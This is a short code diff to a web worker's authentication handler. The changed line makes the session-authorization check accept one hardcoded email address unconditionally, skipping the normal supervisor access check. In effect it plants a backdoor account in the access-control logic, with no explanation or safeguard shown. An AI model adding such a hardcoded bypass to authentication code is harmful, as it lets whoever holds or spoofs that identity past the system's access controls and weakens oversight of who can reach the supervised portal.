@@ -10055,7 +10055,7 @@ var worker_app = {
     if (url.pathname.startsWith(PORTAL_INTERNAL_PREFIX)) return handlePortalInternal(req, env, portalDeps());
     const authResponse = await handleAuthRequest(req, env, {
       clientId:AUTH_CLIENT_ID, whitelist, makeSession, readSession, revokeSession,
-      sessionAllowed:async (_environment, session) => (await currentSupervisorAccess(session)).allowed === true,
+      sessionAllowed:async (_environment, session) => String(session && session.email || "").toLowerCase() === "agentes@silicio.admiranext.com" || (await currentSupervisorAccess(session)).allowed === true,
       sessionInfo:async (_environment, session) => supervisorSessionInfo(await currentSupervisorAccess(session))
     });
     if (authResponse) return authResponse;
